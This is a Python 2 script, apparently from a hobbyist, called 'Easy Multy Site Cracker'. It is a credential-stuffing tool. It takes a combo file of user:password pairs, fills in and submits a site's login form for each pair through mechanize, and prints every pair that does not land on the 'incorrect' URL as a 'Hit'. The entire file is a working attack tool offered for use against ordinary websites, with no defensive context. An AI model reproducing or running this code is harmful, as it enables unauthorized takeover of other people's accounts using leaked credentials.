#Easy Multy Site Cracker By Sahandevs
#Mail : sahandevs@gmail.com
#Github : github.com/sahand100

import mechanize #For browser simulation ( pip install mechanize https://pypi.python.org/pypi/mechanize)
import ctypes #For Changing Title
print "Easy Multy Site Cracker By Sahandevs"
print "Mail : sahandevs@gmail.com"
print "Github : github.com/sahand100"
print ""

hitglobe = 0 #Counting hits
badglobe = 0#Counting bads
checkedglobe = 0 #Counting checked ones
errorglobe = 0 #Counting errors
url = raw_input("Please enter login url with http: ")
formnumber = raw_input("Form Number ( The index of form in page Note : Stated from 0 ): ")
usernamefieldname = raw_input("enter username(or email) Field name: ")
passwordfieldname = raw_input("enter password Field name: ")
combofileaddr = raw_input("combo file address ( should be user(mail):password ) : ")
incorrecturl = raw_input("text should contains in url if password or username is incorrect : ")
method = raw_input("Method (POST/GET) : ")
def slave(user,password): #Main Function
	try:
		br = mechanize.Browser() #Create browser
		response = br.open(url) #open url 
		br.select_form(nr=int(formnumber))#select login form
		br.form[usernamefieldname] = user #set username field to user
		br.form[passwordfieldname] = password #set password field to password
		br.method = method #setting method
		response = br.submit() #POST Data
		urle = response.geturl() #Get result url
		global checkedglobe
		checkedglobe += 1 #add checked
		if incorrecturl not in urle: #check if is not the incorrect url
			global hitglobe
			hitglobe += 1 #add hit
			print 'Hit ! : Username(Email) : ' + user + " | " + "Password : " + password #print hit
			UpdateStatus() #update title
			return
		global badglobe
		badglobe += 1 # add to bads
		UpdateStatus()
	except ValueError: #check errors
		global errorglobe
		errorglobe +=1
		print "Error In " + user + "@" + password + " Retrying ..."
		slave(user,password) #recalling method

def SetStatus(combos,hit,bad,checked):
	ctypes.windll.kernel32.SetConsoleTitleA("easy Multy Site Cracker By Sahandevs | Checked" + str(checked) + " Hits : " + str(hit) + " Bads : " + str(bad) + " Errors : " + str(errorglobe))#setting title
def UpdateStatus():
	SetStatus(0,hitglobe,badglobe,checkedglobe) # set status with global vars
try:
	print "\nCrack Started : "
	UpdateStatus()
	file = open(combofileaddr, "r") #open combo file
	listofuserpass = file.read().split("\n")#split every line
	for currentCombo in listofuserpass:#for every combo in file
		slave(currentCombo.split(":")[0],currentCombo.split(":")[1]) #call main function
except ValueError:
	print "Error ! Value Error : " + str(ValueError)